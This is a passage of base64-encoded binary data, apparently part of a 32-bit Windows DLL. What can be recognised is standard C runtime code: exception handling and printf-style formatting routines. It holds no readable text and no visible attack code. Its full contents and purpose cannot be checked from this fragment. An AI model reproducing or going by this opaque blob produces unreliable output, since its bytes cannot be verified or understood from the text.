tNCFGJCOggAAAAWYvw6AUAAACJMF5dw+i8FAAAhcB1Brh4iQEQw4PACMNVi+yLTQgzwDsMxRCIARB0J0CD+C1y8Y1B7YP4EXcFag1YXcONgUT///9qDlk7yBvAI8GDwAhdw4sExRSIARBdw6EkuAEQVmoUXoXAdQe4AAIAAOsGO8Z9B4vGoyS4ARBqBFDoHDUAAKMguAEQWVmFwHUeagRWiTUkuAEQ6AM1AACjILgBEFlZhcB1BWoaWF7DM9K5gIkBEIkMAoPBII1SBIH5AIwBEH0HoSC4ARDr6DPAXsPoTT0AAIA9BJ0BEAB0Bej4OwAA/zUguAEQ6J77//+DJSC4ARAAWcO4gIkBEMNVi+xWi3UIuYCJARA78XIigf7giwEQdxqLxivBwfgFg8AQUOiROAAAgU4MAIAAAFnrCo1GIFD/FUjwABBeXcNVi+yLRQiD+BR9FoPAEFDoZjgAAItFDFmBSAwAgAAAXcOLRQyDwCBQ/xVI8AAQXcNVi+yLRQi5gIkBEDvBch894IsBEHcYgWAM/3///yvBwfgFg8AQUOiJOQAAWV3Dg8AgUP8VTPAAEF3DVYvsi00Ii0UMg/kUfROBYAz/f///jUEQUOhcOQAAWV3Dg8AgUP8VTPAAEF3DVYvsg30IAHQmVot1DPdGDAAQAAB0GFbozzsAAIFmDP/u//8zwFmJRhiJBolGCF5dw1WL7FaLdQhW6P48AABQ6Bw9AABZWYXAD4SGAAAAV+jQ/v//g8AgO/B1BDP/6w/owP7//4PAQDvwdWYz/0f/BayZARD3RgwMAQAAdVSDPL2wmQEQAFO7ABAAAHUlU+iCMwAAiQS9sJkBEFmFwHUTjUYUagKJRgiJBliJRhiJRgTrEosMvbCZARCJTgiJDoleGIleBIFODAIRAAAzwEBb6wIzwF9eXcNVi+xWi/GLTQjGRgwAhcl1Zlfo8REAAIv4iX4Ii1dsiRaLT2iJTgQ7FQyUARB0EaHIlAEQhUdwdQfoLj8AAIkGi0YEXzsFrJEBEHQVi04IociUARCFQXB1COiQQgAAiUYEi04Ii0FwqAJ1FoPIAolBcMZGDAHrCosBiQaLQQSJRgSLxl5dwgQAzFWL7IHsiAQAAKEAiAEQM8WJRfyLRQiNjbD7//9TVomF2Pv//4tFDFf/dRCLfRSJhfj7//8zwIvYib3w+///iYWk+///i/CJnez7//+JhdD7//+Jhej7//+Jhdz7//+Jhaj7//+JhcD7//+JhdT7///oAv///+hc/P//iYWc+///OZ3Y+///dSroSfz//8cAFgAAAOjP+///OJ28+///dAqLhbj7//+DYHD9g8j/6fUKAACLlfj7//+F0nTMD7cSM8mJjfT7//+LwYmF4Pv//4mNzPv//4mNrPv//4mV5Pv//2aF0g+EqgoAAMeFkPv//1gAAADHhYz7//9kAAAAx4WI+///aQAAAMeFmPv//28AAACDhfj7//8ChcAPiHMKAABqWI1C4F9mO8d3Dw+3wg++gMgNARCD4A/rAjPAi73M+///D768x+gNARCLx4m9zPv//4u98Pv//8H4BImFzPv//4P4Bw+HCwoAAP8khfw/ABAzwION6Pv///+L2ImFqPv//4mFwPv//4mF0Pv//4mF3Pv//4md7Pv//4mF1Pv//+nQCQAAD7fCaiBaK8J0RoPoA3Q5g+gIdC9ISHQdg+gDi4X4+///D4WvCQAAg8sIiZ3s+///6aEJAACDywSJnez7///pjQkAAIPLAevwgcuAAAAA6+iDywLr42oqWGY70HUviweDxwSJvfD7//+JhdD7//+FwA+JWgkAAIPLBPfYiZ3s+///iYXQ+///6UQJAABrjdD7//8KD7fCg8HQA8GJhdD7///pJAkAADPAiYXo+///6R0JAABqKlhmO9B1K4sHg8cEiYXo+///hcCLhfj7//+JvfD7//8PifwIAACDjej7////6fAIAABrjej7//8KD7fCg8HQA8GJhej7///pyggAAA+3woP4SXRXg/hodEhqbFo7wnQag/h3i4X4+///D4WzCAAAgcsACAAA6fz+//+Lhfj7//9mORB1FIPAAoHLABAAAImF+Pv//+nd/v//g8sQ6dX+//9qIFgL2OnZ/v//i4X4+///D7cAg/g2dSOLvfj7//9mg38CNHUWi8eDwASBywCAAACJhfj7///pmv7//4P4M3Uji734+///ZoN/AjJ1FovHg8AEgeP/f///iYX4+///6XL+//9mO4WM+///D4QLCAAAZjuFiPv//w+E/gcAAGY7hZj7//8PhPEHAACD+HUPhOgHAACD+HgPhN8HAABmO4WQ+///D4TSBwAAM8CJhcz7//+NheD7///HhdT7//8BAAAAUP+12Pv//1LoOwgAAIPEDOmfBwAAD7fCg/hkD48pAgAAD4SxAgAAg/hTD48lAQAAdH2D6EF0EEhIdFhISHQISEgPhZoFAABqIFgD0MeFqPv//wEAAACJleT7//+Lhej7//+Ntfz7//+Dy0C5AAIAAImd7Pv//4mN9Pv//4XAD4mOAgAAx4Xo+///BgAAAOnfAgAA98MwCAAAD4XYAAAAaiBYC9iJnez7///pyAAAAPfDMAgAAHULaiBYC9iJnez7//+Llej7//+/////f4P6/3QCi/qLtfD7//+DxgSJtfD7//+Ldvz2wyAPhL8EAACF9nUGizX0lAEQM8mLxomF5Pv//4mN9Pv//4X/D47QBAAAigCEwA+ExgQAAI2NsPv//w+2wFFQ6LdBAABZhcCLheT7//9ZdAFAi430+///QEGJheT7//+JjfT7//87z3zB6YwEAACD6FgPhNwCAABISA+EiwAAAIPoBw+E7f7//0hID4VqBAAAD7cHg8cEx4XU+///AQAAAIm98Pv//4mFoPv///bDIHREiIXE+///M8CIhcX7//+NhbD7//9Qi4Ww+////3B0jYXE+///UI2F/Pv//1Do/0IAAIPEEIXAeRPHhcD7//8BAAAA6wdmiYX8+///M8mNtfz7//9B6eoDAACLB4PHBIm98Pv//4XAdDaLcASF9nQv98MACAAAdBcPvwCZK8LHhdT7//8BAAAAi8jpswMAADPJiY3U+///D78I6aUDAACLNfSUARBW6PovAABZi8jpkQMAAIP4cA+P6wEAAA+E1wEAAIP4ZQ+MfwMAAIP4Zw+O8f3//2ppWjvCdGaD+G50J2pvWjvCD4VfAwAAx4Xk+///CAAAAITbeVuBywACAACJnez7///rTYPHBIm98Pv//4t//Oh+QAAAhcAPhEUFAACLheD7///2wyB0BWaJB+sCiQfHhcD7//8BAAAA6cMEAACDy0CJnez7///HheT7//8KAAAA98MAgAAAdQz3wwAQAAAPhJcBAACLD4PHCIm98Pv//4t//OmwAQAAdRRqZ1hmO9B1VseF6Pv//wEAAADrSjvBfgiLwYmF6Pv//z2jAAAAfjeNuF0BAABX6LIrAACLleT7//+Jhaz7//9ZhcB0Covwib30+///6wrHhej7//+jAAAAi73w+///iweDxwiJhXj7//+JvfD7//+LR/yJhXz7//+NhbD7//9Q/7Wo+///D77C/7Xo+///UP+19Pv//42FePv//1ZQ/zXklAEQ/xUw8AAQ/9CL+4PEHIHngAAAAHQhg73o+///AHUYjYWw+///UFb/NfCUARD/FTDwABD/0FlZamdYZjmF5Pv//3Uchf91GI2FsPv//1BW/zXslAEQ/xUw8AAQ/9BZWYA+LQ+FHv7//4HLAAEAAEaJnez7///pDP7//8eF6Pv//wgAAABqB+scg+hzD4R7/P//SEgPhJL+//+D6AMPhYkBAABqJ8eF5Pv//xAAAABYiYWk+///hNsPiXj+//9qMFmDwFFmiY3I+///ZomFyvv//8eF3Pv//wIAAADpVf7//4PHBIm98Pv///bDIHQR9sNAdAYPv0f86w4Pt0f86wj2w0B0DItH/JmLyIv6M8DrB4tP/DPAi/j2w0B0HDv4fxh8BDvIcxL32RP499+BywABAACJnez7///3wwCQAAB1Aov4i5Xo+///hdJ5BTPSQusWg+P3iZ3s+///gfoAAgAAfgW6AAIAAIvBC8d1BomF3Pv//421+/3//4vCSomV6Pv//4XAfwaLwQvHdD2LheT7//+ZUlBXUeiKQAAAg8EwiZ2E+///iYX0+///i/qD+Tl+BgONpPv//4uV6Pv//4gOTouN9Pv//+uwi53s+///jY37/f//K85GiY30+///98MAAgAAdEWFyXQFgD4wdDxOQWowWIgG6y2F9nUGizX4lAEQx4XU+///AQAAAIvOhf90DzPAT2Y5AXQHg8EChf918yvO0fmJjfT7//+DvcD7//8AD4WtAQAA9sNAdCD3wwABAAAPhB0BAABqLVhmiYXI+///x4Xc+///AQAAAGogWou90Pv//4uF3Pv//yv5K/j2wwx1HY2F4Pv//1D/tdj7//9XUug/AgAAi4Xc+///g8QQ/7Wc+///jY3g+///Uf+12Pv//1CNhcj7//9Q6EICAACDxBT2wwh0H/bDBHUajYXg+///UP+12Pv//1dqMFhQ6PIBAACDxBCDvdT7//8Ai4X0+///D4WzAAAAhcAPjqsAAACLzom15Pv//0iJhYT7//+NhbD7//9Qi4Ww+////3B0jYWg+///UVDo8j0AAIPEEImFlPv//4XAfmeNheD7//9Q/7XY+////7Wg+///6E0BAACLjeT7//+DxAwDjZT7//+LhYT7//+Jje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